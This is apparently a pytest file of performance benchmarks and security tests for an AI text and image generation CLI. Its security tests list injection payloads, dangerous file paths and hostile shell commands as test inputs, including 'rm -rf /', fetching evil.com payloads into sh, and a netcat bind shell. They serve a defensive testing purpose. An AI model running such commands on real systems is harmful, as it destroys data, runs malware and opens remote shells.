"""
Performance benchmarks and security validation tests.

Tests performance characteristics and security aspects including:
- Response time benchmarks
- Memory usage monitoring
- Throughput testing
- Input validation and sanitization
- Security vulnerability prevention
- Resource usage limits
- Concurrent access safety
"""

import pytest
import time
import threading
import os
import sys
import resource
import tempfile
import json
from unittest.mock import Mock, patch
from typing import List, Dict, Any

from q.generators.text import TextGenerator
from q.generators.image import ImageGenerator
from q.providers.openai import OpenAIProvider
from q.config.manager import ConfigManager
from q.utils.processing import ResponseProcessor
from q.cli import main as cli_main
from tests.conftest import MockProvider, create_test_image_data


@pytest.mark.performance
class TestPerformanceBenchmarks:
    """Performance benchmark tests."""
    
    def test_text_generation_response_time(self, mock_provider):
        """Test text generation response time is within acceptable limits."""
        generator = TextGenerator(provider=mock_provider)
        
        # Benchmark single generation
        start_time = time.time()
        response = generator.generate("What is Python?", command_type="explain")
        end_time = time.time()
        
        response_time = end_time - start_time
        
        # Should complete within 1 second for mock provider
        assert response_time < 1.0, f"Text generation took {response_time:.3f}s, expected < 1.0s"
        
        # Benchmark multiple generations
        iterations = 10
        start_time = time.time()
        
        for i in range(iterations):
            generator.generate(f"Test generation {i}", command_type="explain")
        
        end_time = time.time()
        total_time = end_time - start_time
        avg_time = total_time / iterations
        
        # Average should be reasonable
        assert avg_time < 0.5, f"Average generation time {avg_time:.3f}s, expected < 0.5s"
        assert total_time < 5.0, f"Total time for {iterations} generations: {total_time:.3f}s, expected < 5.0s"
    
    def test_image_generation_response_time(self, mock_provider):
        """Test image generation response time is within acceptable limits."""
        generator = ImageGenerator(provider=mock_provider)
        
        # Benchmark single image generation
        start_time = time.time()
        image_data = generator.generate("A test image")
        end_time = time.time()
        
        response_time = end_time - start_time
        
        # Should complete within 2 seconds for mock provider
        assert response_time < 2.0, f"Image generation took {response_time:.3f}s, expected < 2.0s"
        
        # Verify image data is reasonable size
        assert len(image_data) > 0
        assert len(image_data) < 1024 * 1024  # Should be under 1MB for test data
    
    def test_conversation_history_performance(self, mock_provider):
        """Test performance with large conversation histories."""
        generator = TextGenerator(provider=mock_provider)
        
        # Build up a large conversation
        conversation_size = 100
        
        start_time = time.time()
        for i in range(conversation_size):
            generator.generate_with_history(f"Message {i}")
        build_time = time.time() - start_time
        
        # Should handle large conversations efficiently
        assert build_time < 10.0, f"Building {conversation_size} message conversation took {build_time:.3f}s"
        assert len(generator.conversation_history) == conversation_size * 2  # User + Assistant pairs
        
        # Test retrieval performance
        start_time = time.time()
        history = generator.get_history()
        retrieval_time = time.time() - start_time
        
        assert retrieval_time < 0.1, f"History retrieval took {retrieval_time:.3f}s"
        assert len(history) == conversation_size * 2
        
        # Test export/import performance
        start_time = time.time()
        exported = generator.export_conversation()
        export_time = time.time() - start_time
        
        start_time = time.time()
        new_generator = TextGenerator(provider=mock_provider)
        new_generator.import_conversation(exported)
        import_time = time.time() - start_time
        
        assert export_time < 1.0, f"Export took {export_time:.3f}s"
        assert import_time < 1.0, f"Import took {import_time:.3f}s"
        assert len(new_generator.conversation_history) == len(generator.conversation_history)
    
    def test_concurrent_generation_performance(self, mock_provider):
        """Test performance under concurrent load."""
        generator = TextGenerator(provider=mock_provider)
        
        results = []
        errors = []
        start_times = []
        end_times = []
        
        def generate_text(thread_id):
            try:
                start_time = time.time()
                start_times.append(start_time)
                
                response = generator.generate(f"Concurrent test {thread_id}", command_type="explain")
                
                end_time = time.time()
                end_times.append(end_time)
                
                results.append((thread_id, response, end_time - start_time))
            except Exception as e:
                errors.append((thread_id, e))
        
        # Run concurrent generations
        num_threads = 10
        threads = []
        
        overall_start = time.time()
        
        for i in range(num_threads):
            thread = threading.Thread(target=generate_text, args=(i,))
            threads.append(thread)
            thread.start()
        
        for thread in threads:
            thread.join()
        
        overall_end = time.time()
        overall_time = overall_end - overall_start
        
        # Check results
        assert len(errors) == 0, f"Errors in concurrent execution: {errors}"
        assert len(results) == num_threads
        
        # Performance assertions
        assert overall_time < 5.0, f"Concurrent execution took {overall_time:.3f}s"
        
        # Check individual response times
        response_times = [result[2] for result in results]
        max_response_time = max(response_times)
        avg_response_time = sum(response_times) / len(response_times)
        
        assert max_response_time < 2.0, f"Slowest concurrent request: {max_response_time:.3f}s"
        assert avg_response_time < 1.0, f"Average concurrent response time: {avg_response_time:.3f}s"
    
    def test_memory_usage_monitoring(self, mock_provider):
        """Test memory usage remains within reasonable bounds."""
        generator = TextGenerator(provider=mock_provider)
        
        # Get initial memory usage
        initial_memory = resource.getrusage(resource.RUSAGE_SELF).ru_maxrss
        
        # Generate many responses
        num_generations = 50
        for i in range(num_generations):
            generator.generate(f"Memory test {i}", command_type="explain")
        
        # Check memory usage after generations
        after_generation_memory = resource.getrusage(resource.RUSAGE_SELF).ru_maxrss
        
        # Build up conversation history
        for i in range(50):
            generator.generate_with_history(f"History test {i}")
        
        # Check memory usage after building history
        after_history_memory = resource.getrusage(resource.RUSAGE_SELF).ru_maxrss
        
        # Clear history and check memory (may not immediately free due to Python GC)
        generator.clear_history()
        after_clear_memory = resource.getrusage(resource.RUSAGE_SELF).ru_maxrss
        
        # Memory increase should be reasonable (values in KB on Linux, bytes on macOS)
        memory_scale = 1024 if sys.platform == 'darwin' else 1
        memory_increase = (after_generation_memory - initial_memory) / memory_scale
        
        # Should not use more than 50MB for simple operations
        assert memory_increase < 50 * 1024, f"Memory increased by {memory_increase:.0f}KB during generation"
        
        # History should not cause excessive memory growth
        history_increase = (after_history_memory - after_generation_memory) / memory_scale
        assert history_increase < 10 * 1024, f"History added {history_increase:.0f}KB"
    
    def test_response_processing_performance(self):
        """Test response processing performance with large inputs."""
        processor = ResponseProcessor()
        
        # Create large text with various formatting
        large_text = "This is a test response. " * 1000
        large_text += "\n\n```python\n"
        large_text += "print('hello world')\n" * 500
        large_text += "```\n\n"
        large_text += "Check [this link](https://example.com) " * 100
        large_text += "\n\nUse `code` " * 200
        
        # Benchmark processing
        start_time = time.time()
        processed = processor.process_text_response(large_text)
        end_time = time.time()
        
        processing_time = end_time - start_time
        
        # Should process large text quickly
        assert processing_time < 1.0, f"Processing large text took {processing_time:.3f}s"
        
        # Verify processing worked correctly
        assert "this link" in processed  # Links shortened
        assert "\x1b[36m" in processed  # Code colored
        assert "print('hello world')" in processed  # Code blocks processed
    
    @pytest.mark.slow
    def test_stress_test_extended_usage(self, mock_provider):
        """Extended stress test simulating heavy usage."""
        generator = TextGenerator(provider=mock_provider)
        
        start_time = time.time()
        operations = 0
        
        # Run for 10 seconds or 1000 operations, whichever comes first
        while time.time() - start_time < 10 and operations < 1000:
            # Mix of different operations
            if operations % 5 == 0:
                generator.generate(f"Stress test {operations}", command_type="explain")
            elif operations % 5 == 1:
                generator.generate_with_history(f"History test {operations}")
            elif operations % 5 == 2:
                generator.get_history()
            elif operations % 5 == 3:
                if len(generator.conversation_history) > 10:
                    generator.export_conversation()
            else:
                if operations % 20 == 4:
                    generator.clear_history()
            
            operations += 1
        
        total_time = time.time() - start_time
        throughput = operations / total_time
        
        # Should maintain reasonable throughput
        assert throughput > 50, f"Throughput too low: {throughput:.1f} ops/sec"
        assert operations > 500, f"Only completed {operations} operations in stress test"


@pytest.mark.security
class TestSecurityValidation:
    """Security validation tests."""
    
    def test_input_sanitization_text_generation(self, mock_provider):
        """Test that malicious inputs are properly sanitized."""
        generator = TextGenerator(provider=mock_provider)
        
        # Test potentially malicious inputs
        malicious_inputs = [
            "<script>alert('xss')</script>",
            "'; DROP TABLE users; --",
            "../../../etc/passwd",
            "{{7*7}}",  # Template injection
            "${java.lang.Runtime.getRuntime().exec('whoami')}",  # Expression injection
            "javascript:alert('xss')",
            "<img src=x onerror=alert('xss')>",
            "file:///etc/passwd",
            "data:text/html,<script>alert('xss')</script>",
            "\x00\x01\x02\x03",  # Null bytes and control characters
        ]
        
        for malicious_input in malicious_inputs:
            try:
                # Should not crash or execute malicious code
                response = generator.generate(malicious_input, command_type="explain")
                
                # Response should be safe string
                assert isinstance(response, str)
                assert len(response) > 0
                
                # Should not contain the exact malicious input (may be processed)
                # This is a basic check - real implementation should have proper sanitization
                
            except Exception as e:
                # Should not raise unexpected exceptions
                assert "malicious" not in str(e).lower(), f"Unexpected error for input {malicious_input}: {e}"
    
    def test_file_path_security(self, mock_provider):
        """Test file path security in image generation."""
        generator = ImageGenerator(provider=mock_provider)
        test_image_data = create_test_image_data()
        
        # Test potentially dangerous file paths
        dangerous_paths = [
            "../../../etc/passwd",
            "/etc/passwd",
            "..\\..\\windows\\system32\\config\\sam",
            "con.txt",  # Windows reserved name
            "aux.png",  # Windows reserved name
            "prn.jpg",  # Windows reserved name
            "/dev/null",
            "/proc/self/environ",
            "file:///etc/passwd",
            "\\\\server\\share\\file.png",
            "file.png\x00.exe",  # Null byte injection
        ]
        
        for dangerous_path in dangerous_paths:
            try:
                # Should handle dangerous paths safely
                result_path = generator.save_image(test_image_data, dangerous_path)
                
                # Result should be a safe path
                assert isinstance(result_path, str)
                assert len(result_path) > 0
                
                # Should not be the exact dangerous path
                assert result_path != dangerous_path or dangerous_path.endswith('.png')
                
            except (OSError, ValueError) as e:
                # It's acceptable to reject dangerous paths with appropriate errors
                pass
            except Exception as e:
                pytest.fail(f"Unexpected error for path {dangerous_path}: {e}")
    
    def test_configuration_security(self, temp_config_dir):
        """Test configuration file security."""
        config_path = os.path.join(temp_config_dir, 'test_config.json')
        config = ConfigManager(config_path=config_path)
        
        # Test that sensitive data is handled securely
        sensitive_data = {
            'api_key': 'sk-very-secret-key-12345',
            'password': 'super-secret-password',
            'token': 'bearer-token-xyz'
        }
        
        for key, value in sensitive_data.items():
            config._save_resource(key, value)
        
        # Verify file exists and is readable
        assert os.path.exists(config_path)
        
        # Check file permissions (should not be world-readable)
        stat_info = os.stat(config_path)
        file_mode = stat_info.st_mode
        
        # On Unix systems, check that file is not world-readable
        if hasattr(os, 'R_OK') and os.name != 'nt':
            world_readable = bool(file_mode & 0o004)
            assert not world_readable, "Configuration file should not be world-readable"
        
        # Test that data can be retrieved
        for key, expected_value in sensitive_data.items():
            retrieved_value = config._load_resource(key, None)
            assert retrieved_value == expected_value
    
    def test_api_key_security(self, temp_config_dir):
        """Test API key security handling."""
        config_path = os.path.join(temp_config_dir, 'secure_config.json')
        config = ConfigManager(config_path=config_path)
        
        # Test setting API key
        test_api_key = 'sk-test-key-with-special-chars-!@#$%^&*()'
        config.set_api_key('openai', test_api_key)
        
        # Key should be stored
        retrieved_key = config.get_api_key('openai')
        assert retrieved_key == test_api_key
        
        # Test with empty/None keys
        config.set_api_key('test_provider', '')
        empty_key = config.get_api_key('test_provider')
        assert empty_key == ''
        
        config.set_api_key('test_provider', None)
        none_key = config.get_api_key('test_provider')
        assert none_key is None
        
        # Test key validation (basic)
        with pytest.raises((ValueError, TypeError)):
            config.set_api_key('', 'valid-key')  # Empty provider name
    
    def test_command_injection_prevention(self):
        """Test prevention of command injection attacks."""
        processor = ResponseProcessor()
        
        # Test inputs that could lead to command injection
        injection_attempts = [
            "```bash\nrm -rf / --no-preserve-root\n```",
            "```bash\ncat /etc/passwd\n```",
            "```bash\nwget http://evil.com/malware.sh | sh\n```",
            "```bash\n$(curl http://evil.com/payload)\n```",
            "```bash\n`nc -l -p 1234 -e /bin/sh`\n```",
        ]
        
        for injection_attempt in injection_attempts:
            # Should process without executing commands
            result = processor.process_text_response(injection_attempt)
            
            # Should format as code (with $ prefix and coloring)
            assert "$ " in result
            assert "\x1b[36m" in result  # Should be colored
            
            # Should not actually execute the commands (this is handled by formatting only)
            # The processor only formats text, it doesn't execute anything
    
    def test_memory_exhaustion_prevention(self, mock_provider):
        """Test prevention of memory exhaustion attacks."""
        generator = TextGenerator(provider=mock_provider)
        
        # Test with very large inputs
        large_input = "A" * 1000000  # 1MB string
        
        start_memory = resource.getrusage(resource.RUSAGE_SELF).ru_maxrss
        
        try:
            response = generator.generate(large_input, command_type="explain")
            
            # Should handle large input without crashing
            assert isinstance(response, str)
            
        except Exception as e:
            # Should fail gracefully if input is too large
            assert "too large" in str(e).lower() or "memory" in str(e).lower()
        
        end_memory = resource.getrusage(resource.RUSAGE_SELF).ru_maxrss
        memory_scale = 1024 if sys.platform == 'darwin' else 1
        memory_increase = (end_memory - start_memory) / memory_scale
        
        # Should not cause excessive memory usage
        assert memory_increase < 100 * 1024, f"Memory increased by {memory_increase:.0f}KB"
    
    def test_concurrent_access_safety(self, mock_provider):
        """Test thread safety and concurrent access."""
        generator = TextGenerator(provider=mock_provider)
        
        results = []
        errors = []
        
        def concurrent_operation(thread_id):
            try:
                # Mix of operations that could cause race conditions
                for i in range(10):
                    if i % 3 == 0:
                        generator.generate(f"Thread {thread_id} message {i}")
                    elif i % 3 == 1:
                        generator.generate_with_history(f"Thread {thread_id} history {i}")
                    else:
                        history = generator.get_history()
                        results.append((thread_id, len(history)))
                        
                        if len(history) > 5:
                            generator.clear_history()
                
            except Exception as e:
                errors.append((thread_id, e))
        
        # Run concurrent operations
        num_threads = 5
        threads = []
        
        for i in range(num_threads):
            thread = threading.Thread(target=concurrent_operation, args=(i,))
            threads.append(thread)
            thread.start()
        
        for thread in threads:
            thread.join()
        
        # Should not have race condition errors
        race_condition_errors = [
            error for thread_id, error in errors
            if "race" in str(error).lower() or "concurrent" in str(error).lower()
        ]
        
        assert len(race_condition_errors) == 0, f"Race condition errors: {race_condition_errors}"
        
        # Some errors might be expected due to concurrent access, but shouldn't be crashes
        for thread_id, error in errors:
            assert not isinstance(error, (SystemError, MemoryError)), f"Critical error in thread {thread_id}: {error}"
    
    def test_resource_limits(self, mock_provider):
        """Test that resource usage stays within reasonable limits."""
        generator = TextGenerator(provider=mock_provider)
        
        # Test file descriptor limits
        initial_fds = len(os.listdir('/proc/self/fd')) if os.path.exists('/proc/self/fd') else 0
        
        # Perform many operations
        for i in range(100):
            generator.generate(f"Resource test {i}")
            if i % 10 == 0:
                generator.export_conversation()
        
        # Check file descriptors haven't leaked
        if os.path.exists('/proc/self/fd'):
            final_fds = len(os.listdir('/proc/self/fd'))
            fd_increase = final_fds - initial_fds
            assert fd_increase < 10, f"File descriptor leak: {fd_increase} new FDs"
        
        # Test temporary file cleanup
        temp_files_before = len([f for f in os.listdir(tempfile.gettempdir()) if f.startswith('tmp')])
        
        # Operations that might create temp files
        for i in range(10):
            generator.export_conversation()
            exported = generator.export_conversation()
            generator.import_conversation(exported)
        
        temp_files_after = len([f for f in os.listdir(tempfile.gettempdir()) if f.startswith('tmp')])
        temp_file_increase = temp_files_after - temp_files_before
        
        # Should not leave many temporary files
        assert temp_file_increase < 5, f"Temporary file leak: {temp_file_increase} new temp files"
    
    def test_error_information_disclosure(self, mock_provider):
        """Test that errors don't disclose sensitive information."""
        generator = TextGenerator(provider=mock_provider)
        
        # Configure provider to raise errors with potentially sensitive info
        def error_generating_method(*args, **kwargs):
            raise Exception("Database error: connection failed to mysql://user:password@host/db")
        
        mock_provider.generate_text = error_generating_method
        
        try:
            generator.generate("Test error handling")
            pytest.fail("Expected exception was not raised")
        except Exception as e:
            error_message = str(e)
            
            # Should not expose sensitive connection details
            assert "password" not in error_message.lower(), "Error message exposes password"
            assert "mysql://" not in error_message, "Error message exposes connection string"
            
            # Should be a generic error message
            assert "generation failed" in error_message.lower() or "error" in error_message.lower()


@pytest.mark.performance
@pytest.mark.slow
class TestStressTesting:
    """Extended stress testing scenarios."""
    
    def test_sustained_load_test(self, mock_provider, performance_benchmarks):
        """Test sustained load over extended period."""
        generator = TextGenerator(provider=mock_provider)
        
        duration = 30  # 30 second test
        max_response_time = performance_benchmarks['max_response_time']
        
        start_time = time.time()
        operations = 0
        slow_operations = 0
        errors = 0
        
        while time.time() - start_time < duration:
            try:
                op_start = time.time()
                generator.generate(f"Sustained load test {operations}")
                op_end = time.time()
                
                op_time = op_end - op_start
                if op_time > max_response_time:
                    slow_operations += 1
                
                operations += 1
                
            except Exception:
                errors += 1
        
        total_time = time.time() - start_time
        throughput = operations / total_time
        error_rate = errors / (operations + errors) if (operations + errors) > 0 else 0
        slow_rate = slow_operations / operations if operations > 0 else 0
        
        # Performance assertions
        assert throughput >= performance_benchmarks['min_throughput'], f"Throughput too low: {throughput:.2f} ops/sec"
        assert error_rate < 0.01, f"Error rate too high: {error_rate:.2%}"
        assert slow_rate < 0.05, f"Too many slow operations: {slow_rate:.2%}"
        
        print(f"Sustained load test: {operations} ops in {total_time:.1f}s, "
              f"throughput: {throughput:.1f} ops/sec, errors: {errors}, slow ops: {slow_operations}")
    
    def test_memory_stability_over_time(self, mock_provider):
        """Test memory stability over extended usage."""
        generator = TextGenerator(provider=mock_provider)
        
        # Take memory snapshots
        snapshots = []
        
        def take_snapshot(label):
            memory_kb = resource.getrusage(resource.RUSAGE_SELF).ru_maxrss
            if sys.platform == 'darwin':
                memory_kb = memory_kb // 1024
            snapshots.append((label, memory_kb))
        
        take_snapshot("initial")
        
        # Phase 1: Build up history
        for i in range(200):
            generator.generate_with_history(f"Memory test {i}")
            if i % 50 == 49:
                take_snapshot(f"after_{i+1}_generations")
        
        # Phase 2: Export/import cycles
        for i in range(10):
            exported = generator.export_conversation()
            new_generator = TextGenerator(provider=mock_provider)
            new_generator.import_conversation(exported)
            
        take_snapshot("after_export_import")
        
        # Phase 3: Clear and rebuild
        generator.clear_history()
        take_snapshot("after_clear")
        
        for i in range(100):
            generator.generate(f"Rebuild test {i}")
        
        take_snapshot("after_rebuild")
        
        # Analyze memory growth
        initial_memory = snapshots[0][1]
        final_memory = snapshots[-1][1]
        peak_memory = max(snapshot[1] for snapshot in snapshots)
        
        memory_growth = final_memory - initial_memory
        peak_growth = peak_memory - initial_memory
        
        # Memory should not grow excessively
        assert memory_growth < 50 * 1024, f"Memory grew by {memory_growth}KB over time"
        assert peak_growth < 100 * 1024, f"Peak memory growth was {peak_growth}KB"
        
        # Print memory profile
        print("Memory usage profile:")
        for label, memory_kb in snapshots:
            print(f"  {label}: {memory_kb:,} KB")


# Helper functions for security testing
def is_safe_path(path: str) -> bool:
    """Check if a file path is safe (doesn't escape intended directory)."""
    return not (
        path.startswith('/') or
        path.startswith('\\') or
        '..' in path or
        path.startswith('~') or
        ':' in path or
        path.lower() in ['con', 'aux', 'prn', 'nul'] or
        any(char in path for char in '\x00\x01\x02\x03\x04\x05\x06\x07\x08\x0b\x0c\x0e\x0f')
    )


def sanitize_input(text: str) -> str:
    """Basic input sanitization for testing purposes."""
    # Remove null bytes and control characters
    sanitized = ''.join(char for char in text if ord(char) >= 32 or char in '\n\r\t')
    
    # Limit length
    if len(sanitized) > 100000:  # 100KB limit
        sanitized = sanitized[:100000]
    
    return sanitized